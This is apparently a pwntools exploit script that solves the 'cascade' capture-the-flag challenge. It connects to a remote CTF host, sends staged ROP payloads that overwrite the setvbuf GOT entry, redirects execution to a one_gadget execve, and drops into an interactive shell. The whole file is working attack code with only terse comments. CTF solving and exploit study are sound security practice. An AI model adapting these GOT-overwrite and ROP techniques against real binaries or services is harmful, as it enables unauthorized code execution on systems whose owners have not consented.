#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 1337
HOST = "cascade.chal.imaginaryctf.org"
exe = context.binary = ELF('./vuln_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x0000000000401179
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE
main = exe.sym.main
setvbuf_got = exe.got.setvbuf
setvbuf_plt = exe.plt.setvbuf
read_addr = 0x401162
gadget = 0x40113c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
gadget_1 = 0x4011c9 # mov eax, 0 ; pop rbp ; ret
rw_section = 0x404300

# PAYLOAD
payload = b'\0'*0x40
payload += flat(
    setvbuf_got + 0x40*2,
    read_addr
    )
input(b'1')
p.send(payload)

payload = flat(
    rw_section, # 0x404048
    setvbuf_plt,
    0x67024, # rbx
    0,
    0,
    0,
    rw_section,
    read_addr
    )
payload += flat(
    setvbuf_got + 0x40,
    read_addr
    )
input(b'2')
p.send(payload)

# Overwrite setvbuf -> setbuffer+327 -> pop rbx; pop r12; pop r13; pop r14; pop rbp; jmp ...
input(b'3')
p.send(b'\x07')

# Overwrite setvbuf -> one_gadget execve
payload = b''
payload = payload.ljust(0x40, b'\0')
payload += flat(
    setvbuf_got + 0x3d,
    gadget,
    gadget_1,
    0x4043a0, # rbp-0x50 is writable; [rbp-0x78] == NULL
    setvbuf_plt
    )
input(b'4')
p.send(payload)

p.interactive()